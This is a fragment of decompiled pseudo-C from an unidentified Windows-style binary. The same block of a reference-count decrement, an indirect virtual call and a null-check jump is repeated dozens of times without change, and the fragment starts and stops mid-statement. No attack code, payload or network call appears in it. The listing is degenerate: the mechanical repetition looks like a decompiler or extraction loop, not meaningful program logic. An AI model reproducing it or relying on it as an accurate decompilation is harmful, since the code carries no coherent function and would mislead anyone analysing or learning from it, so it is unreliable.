0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    